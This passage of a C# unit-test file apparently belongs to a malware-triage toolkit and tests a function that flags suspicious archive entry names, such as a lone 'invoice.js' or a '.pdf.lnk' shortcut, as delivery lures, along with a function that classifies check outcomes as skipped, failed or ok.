    [InlineData("plugin/assets/admin.js", false)]                    // web projects are full of .js
    [InlineData("._admin.js", false)]                                // macOS metadata
    [InlineData("__MACOSX/x/run.bat", false)]
    [InlineData("invoice.js", true)]                                 // a lone top-level script is the classic lure
    [InlineData("docs/Resume.pdf.lnk", true)]
    [InlineData("files/install.vbs", true)]
    [InlineData("crack/run.bat", true)]
    [InlineData("update.hta", true)]
    public void ArchiveLuresAreSpecific(string entry, bool lure) => Assert.Equal(lure, TriageKit.Core.Yara.YaraCheck.DeliveryLure(entry));

    [Fact]
    public void OutcomeTellsSkippedAndFailedApart()
    {
        Assert.Equal("skipped", CheckOutcome.From("a", 1, new { Ran = false, Reason = "Disabled in config" }).State);
        Assert.Equal("Disabled in config", CheckOutcome.From("a", 1, new { Ran = false, Reason = "Disabled in config" }).Note);
        Assert.Equal("failed", CheckOutcome.From("a", 1, new { Error = "Timed out" }).State);
        Assert.Equal("ok", CheckOutcome.From("a", 1, new { Ran = true, Items = 3 }).State);
        Assert.Equal("ok", CheckOutcome.From("a", 1, new List<object>()).State);
        Assert.Equal("ok", CheckOutcome.From("a", 1, null).State);
    }
}
